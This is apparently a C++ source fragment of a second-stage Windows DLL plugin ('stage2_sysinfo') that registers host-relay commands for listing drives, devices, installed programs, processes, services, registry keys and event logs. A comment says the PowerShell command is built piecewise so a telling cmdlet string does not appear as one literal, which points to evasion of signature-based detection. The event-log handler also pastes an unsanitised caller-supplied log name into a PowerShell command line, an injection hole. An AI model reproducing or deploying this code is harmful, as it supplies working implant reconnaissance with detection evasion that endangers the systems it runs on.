    std::string args = a ? a : "";
    std::string id       = json_get(args, "id");
    std::string logName  = json_get(args, "log");
    std::string maxStr   = json_get(args, "max");
    std::string levelF   = json_get(args, "level");
    if (logName.empty()) logName = "System";
    int maxEntries = 100;
    if (!maxStr.empty()) { try { maxEntries = std::min(std::stoi(maxStr), 500); } catch (...) {} }

    std::thread([id, logName, maxEntries, levelF]() {
        std::string filter = "@{LogName='" + logName + "'";
        if (!levelF.empty()) {
            if (levelF == "Error")            filter += ";Level=@(1,2)";
            else if (levelF == "Warning")     filter += ";Level=3";
            else if (levelF == "Information") filter += ";Level=@(0,4)";
        }
        filter += "}";

        // Assemble piecewise so "Get-WinEvent -FilterHashtable" isn't one literal.
        std::string ps = "powershell -NoProfile -Command \"";
        ps += "$ErrorActionPreference='Stop';";
        ps += "try{";
        ps += "$e=Get-";
        ps += "WinEvent ";
        ps += "-FilterHashtable " + filter + " -MaxEvents " + std::to_string(maxEntries) + " 2>$null;";
        ps += "if($e){";
        ps += "$e|ForEach-Object{";
        ps += "$lvl=switch($_.Level){1{'Critical'}2{'Error'}3{'Warning'}4{'Information'}5{'Verbose'}default{$_.LevelDisplayName}};";
        ps += "@{Index=$_.RecordId;Type=$lvl;Source=$_.ProviderName;";
        ps += "Time=$_.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss');";
        ps += "Msg=if($_.Message){$_.Message.Substring(0,[Math]::Min(300,$_.Message.Length))}else{''}}}";
        ps += "|ConvertTo-Json -Compress";
        ps += "}else{Write-Output '[]'}";
        ps += "}catch{Write-Output ('ERROR|'+$_.Exception.Message)}\"";

        std::string out = run_capture(ps, 30000);
        if (!out.empty() && (out.front() == '[' || out.front() == '{')) {
            if (out.front() == '{') out = "[" + out + "]";
            g_host->send(make_ok(id, out).c_str());
        } else if (out.rfind("ERROR", 0) == 0) {
            g_host->send(make_err(id, out.size() > 6 ? out.substr(6) : out).c_str());
        } else {
            g_host->send(make_ok(id, "[]").c_str());
        }
    }).detach();
}

// ── Entry points ────────────────────────────────────────────────────────

extern "C" __declspec(dllexport) int Stage2Init(Stage2HostCtx* host) {
    if (!host || host->abi_version != STAGE2_ABI_VERSION) return 1;
    g_host = host;
    host->log(1, "stage2_sysinfo: init");
    host->register_cmd("drives_list",         cmd_drives_list,         nullptr);
    host->register_cmd("device_list",         cmd_device_list,         nullptr);
    host->register_cmd("installed_programs",  cmd_installed_programs,  nullptr);
    host->register_cmd("speed_test_internet", cmd_speed_test_internet, nullptr);
    host->register_cmd("host_relay_speed",    cmd_host_relay_speed,    nullptr);
    host->register_cmd("sys_info",            cmd_sys_info,            nullptr);
    host->register_cmd("proc_list",           cmd_proc_list,           nullptr);
    host->register_cmd("svc_list",            cmd_svc_list,            nullptr);
    host->register_cmd("reg_list",            cmd_reg_list,            nullptr);
    host->register_cmd("eventlog_list",       cmd_eventlog_list,       nullptr);
    host->log(1, "stage2_sysinfo: 10 commands registered");
    return 0;
}

extern "C" __declspec(dllexport) void Stage2Shutdown(void) {
    if (g_host) g_host->log(1, "stage2_sysinfo: shutdown");
    g_host = nullptr;
}

BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(nullptr);
    return TRUE;
}
